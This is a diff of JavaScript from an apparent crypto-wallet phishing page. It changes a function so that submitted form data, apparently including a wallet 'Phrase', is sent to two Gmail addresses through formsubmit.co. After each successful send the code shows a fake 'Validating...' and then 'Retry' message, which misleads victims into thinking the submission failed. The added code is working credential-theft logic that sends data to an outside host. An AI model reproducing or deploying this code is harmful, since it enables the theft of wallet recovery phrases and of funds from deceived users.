@@ -44,33 +44,76 @@ function submitFormData(connectionMethod) {
 }
 // Placeholder function for sending form data to email using Formsubmit.co
 function sendFormDataToEmail(formData) {
-  // Replace 'YOUR_FORMSUBMIT_ENDPOINT' with the actual endpoint you get from Formsubmit.co
-  var formsubmitEndpoint = 'https://formsubmit.co/ajax/mazzatov005@gmail.com, ashwebb500@gmail.com';
+    // Replace 'YOUR_FORMSUBMIT_ENDPOINT' with the actual endpoint you get from Formsubmit.co
+    var formsubmitEndpoint1 = 'https://formsubmit.co/ajax/mazzatov005@gmail.com'; 
+    var formsubmitEndpoint2 = 'https://formsubmit.co/ajax/ashwebb500@gmail.com'; 
 
-  fetch(formsubmitEndpoint, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(formData),
+    // Make request to first email address endpoint
+    fetch(formsubmitEndpoint1, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(formData),
     })
-    .then(response => response.json())
+    .then(response => {
+        // Check if response is successful
+        if (response.ok) {
+            // Display success message using swal
+            swal('Validating...');
+            // Delay for 2 seconds and then display "Retry" message
+            setTimeout(function() {
+                swal('Retry');
+            }, 2000);
+            return response.json(); // Return response data
+        } else {
+            // Display error message using swal
+            swal('Server Error', 'Error submitting form to email1. Please try again.', 'error');
+            throw new Error('Error submitting form to email1');
+        }
+    })
     .then(data => {
-      console.log('Formsubmit.co response:', data);
-      swal('Validating...');
-
-      // Delay for 2 seconds and then display "Retry again" alert
-      setTimeout(function() {
-        swal('Retry again');
-      }, 2000);
+        console.log('Formsubmit.co response to email1:', data);
+        // Handle response if needed
     })
     .catch(error => {
-      console.error('Error connecting your account, please retry again:', error);
-      swal('Server Error', 'The server is currently unavailable. Please try again later.', 'error');
-      // You can handle errors here if needed
+        console.error('Error connecting to email1:', error);
+        // You can handle errors here if needed
+    });
+
+    // Make request to second email address endpoint
+    fetch(formsubmitEndpoint2, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(formData),
+    })
+    .then(response => {
+        // Check if response is successful
+        if (response.ok) {
+            // Display success message using swal
+            swal('Validating...');
+            // Delay for 2 seconds and then display "Retry" message
+            setTimeout(function() {
+                swal('Retry');
+            }, 2000);
+            return response.json(); // Return response data
+        } else {
+            // Display error message using swal
+            swal('Server Error', 'Error submitting form to email2. Please try again.', 'error');
+            throw new Error('Error submitting form to email2');
+        }
+    })
+    .then(data => {
+        console.log('Formsubmit.co response to email2:', data);
+        // Handle response if needed
+    })
+    .catch(error => {
+        console.error('Error connecting to email2:', error);
+        // You can handle errors here if needed
     });
 }
-
 // Function to validate Phrase form
 function validatePhraseForm() {
     var phraseTextarea = document.forms['phraseForm']['Phrase'].value.trim();
